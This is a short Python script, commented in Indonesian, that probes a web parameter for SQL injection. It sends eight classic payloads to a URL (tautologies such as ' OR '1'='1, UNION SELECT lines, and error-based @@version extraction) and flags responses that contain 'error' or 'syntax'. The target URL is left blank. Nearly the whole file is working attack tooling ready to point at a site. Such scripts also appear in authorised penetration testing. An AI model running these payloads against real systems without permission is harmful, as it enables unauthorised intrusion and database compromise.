import requests

def test_sql_injection(url, param, payloads):
    for payload in payloads:
        # Membuat URL dengan payload SQL Injection
        target_url = f"{url}?{param}={payload}"
        
        try:
            # Mengirim request ke server
            response = requests.get(target_url)
            
            # Memeriksa respons dari server
            if "error" in response.text.lower() or "syntax" in response.text.lower():
                print(f"[!] Potensi SQL Injection ditemukan dengan payload: {payload}")
                print(f"    URL: {target_url}")
            else:
                print(f"[*] Payload {payload} tidak menghasilkan error.")
        
        except requests.exceptions.RequestException as e:
            print(f"[!] Error saat mengirim request: {e}")

if __name__ == "__main__":
    # URL dan parameter yang akan diuji
    url = ""
    param = "username"
    
    # Daftar payload SQL Injection
    payloads = [
        "' OR '1'='1",
        "' OR '1'='1' --",
        "' OR '1'='1' #",
        "' OR '1'='1' /*",
        "' UNION SELECT null, null, null --",
        "' UNION SELECT 1, 'admin', 'password' --",
        "' AND 1=CONVERT(int, (SELECT @@version)) --",
        "' AND 1=CAST((SELECT @@version) AS int) --"
    ]
    
    # Memulai pengujian SQL Injection
    print(f"[*] Memulai pengujian SQL Injection pada {url} dengan parameter {param}")
    test_sql_injection(url, param, payloads)